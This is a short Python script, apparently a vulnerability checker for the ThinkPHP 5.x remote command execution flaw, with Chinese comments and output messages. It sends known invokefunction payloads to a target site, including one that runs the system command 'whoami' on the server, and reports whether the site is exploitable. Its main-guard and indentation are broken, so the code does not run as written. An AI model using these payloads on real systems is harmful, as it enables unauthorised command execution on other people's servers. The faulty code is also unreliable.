#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
name:ThinkPHP 5.x远程命令执行漏洞
author:Eason
"""
import sys
import requests
class think_system_exc():
    def __init__(self,url):
        self.url = url
        if (r"http://" or r"https://") in url:
            self.url=url
    def run(self):
        reqlst=[]
        payload1=[r"public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",r"/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami"]
        for payload in payload1:
            vulurl=self.url+payload
            try:
                req=requests.get(vulurl,timeout=10,verify=False)
                reqlst.append(str(req.text))
            except:
                return "请输入完整的URL"
        if (len(reqlst[0]) !=len(reqlst[1])) and r"System" in reqlst[0]:
            return ("[+]存在ThinkPHP 5.x远程命令执行漏洞\tpayload: "+vulurl)
        else:
            return ("[+]不存在ThinkPHP 5.x远程命令执行漏洞")
if __name__=="main":
testvuln=think_system_exc(sys.argv[1])
testvuln.run()
